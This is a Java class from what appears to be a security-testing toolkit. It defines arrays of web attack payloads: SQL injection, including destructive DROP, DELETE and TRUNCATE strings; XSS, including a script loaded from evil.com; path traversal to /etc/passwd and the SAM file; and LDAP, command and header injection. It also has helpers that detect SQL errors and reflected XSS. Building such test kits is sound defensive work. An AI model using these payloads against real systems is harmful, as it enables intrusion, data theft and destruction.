/**
 * @author Venkateshwara Doijode 
 *
 * © https://github.com/venkywarriors
 */
package com.security.utils;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Security testing payloads for various vulnerability types.
 * Includes built-in payloads and support for loading custom payloads from files.
 */
public class SecurityPayloads {

    // ==================== SQL INJECTION PAYLOADS ====================

    public static final String[] SQL_INJECTION_BASIC = {
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "') OR ('1'='1'--"
    };

    public static final String[] SQL_INJECTION_UNION = {
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION SELECT username, password FROM users--",
        "' UNION ALL SELECT NULL--",
        "' UNION SELECT * FROM users--"
    };

    public static final String[] SQL_INJECTION_ERROR_BASED = {
        "' AND 1=CONVERT(int, @@version)--",
        "' AND 1=1 AND '1'='1",
        "' AND 1=2 AND '1'='1",
        "' AND SUBSTRING(username,1,1)='a'--",
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--"
    };

    public static final String[] SQL_INJECTION_DESTRUCTIVE = {
        "'; DROP TABLE users;--",
        "'; DELETE FROM users;--",
        "'; UPDATE users SET password='hacked';--",
        "'; TRUNCATE TABLE users;--"
    };

    // ==================== XSS PAYLOADS ====================

    public static final String[] XSS_BASIC = {
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(document.domain)</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script src='http://evil.com/xss.js'></script>"
    };

    public static final String[] XSS_EVENT_HANDLERS = {
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror='alert(1)'>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>"
    };

    public static final String[] XSS_JAVASCRIPT_PROTOCOL = {
        "javascript:alert('XSS')",
        "javascript:alert(document.cookie)",
        "<a href=\"javascript:alert(1)\">Click</a>",
        "<iframe src=\"javascript:alert(1)\">"
    };

    public static final String[] XSS_ENCODED = {
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e"
    };

    public static final String[] XSS_DOM_BASED = {
        "#<script>alert('XSS')</script>",
        "?search=<script>alert('XSS')</script>",
        "<img src=1 href=1 onerror='javascript:alert(1)'>"
    };

    // ==================== PATH TRAVERSAL PAYLOADS ====================

    public static final String[] PATH_TRAVERSAL = {
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "..../..../..../etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg"
    };

    // ==================== LDAP INJECTION PAYLOADS ====================

    public static final String[] LDAP_INJECTION = {
        "*",
        "*)(&",
        "*)(uid=*)|(uid=*",
        "admin)(&)",
        "admin)(|(password=*))"
    };

    // ==================== COMMAND INJECTION PAYLOADS ====================

    public static final String[] COMMAND_INJECTION = {
        "; ls -la",
        "| ls -la",
        "& dir",
        "| cat /etc/passwd",
        "`id`",
        "$(id)",
        "; ping -c 3 localhost"
    };

    // ==================== HEADER INJECTION PAYLOADS ====================

    public static final String[] HEADER_INJECTION = {
        "test\r\nX-Injected: header",
        "test%0d%0aX-Injected:%20header",
        "test\r\nSet-Cookie: injected=true"
    };

    // ==================== UTILITY METHODS ====================

    /**
     * Get all SQL injection payloads (non-destructive).
     */
    public static List<String> getAllSqlInjectionPayloads() {
        List<String> payloads = new ArrayList<>();
        payloads.addAll(Arrays.asList(SQL_INJECTION_BASIC));
        payloads.addAll(Arrays.asList(SQL_INJECTION_UNION));
        payloads.addAll(Arrays.asList(SQL_INJECTION_ERROR_BASED));
        return payloads;
    }

    /**
     * Get all XSS payloads.
     */
    public static List<String> getAllXssPayloads() {
        List<String> payloads = new ArrayList<>();
        payloads.addAll(Arrays.asList(XSS_BASIC));
        payloads.addAll(Arrays.asList(XSS_EVENT_HANDLERS));
        payloads.addAll(Arrays.asList(XSS_JAVASCRIPT_PROTOCOL));
        payloads.addAll(Arrays.asList(XSS_ENCODED));
        payloads.addAll(Arrays.asList(XSS_DOM_BASED));
        return payloads;
    }

    /**
     * Load payloads from external file.
     */
    public static List<String> loadPayloadsFromFile(String filePath) {
        List<String> payloads = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty() && !line.startsWith("#")) {
                    payloads.add(line);
                }
            }
        } catch (IOException e) {
            System.err.println("Warning: Could not load payloads from " + filePath);
        }
        return payloads;
    }

    /**
     * Check if response indicates SQL error (potential vulnerability).
     */
    public static boolean containsSqlError(String response) {
        String[] sqlErrors = {
            "sql syntax",
            "mysql_fetch",
            "ORA-",
            "SQLite",
            "PostgreSQL",
            "Microsoft SQL",
            "ODBC",
            "syntax error",
            "unclosed quotation",
            "quoted string not properly terminated"
        };

        String lowerResponse = response.toLowerCase();
        for (String error : sqlErrors) {
            if (lowerResponse.contains(error.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    /**
     * Check if XSS payload is reflected in response without encoding.
     */
    public static boolean isXssReflected(String response, String payload) {
        return response.contains(payload);
    }
}
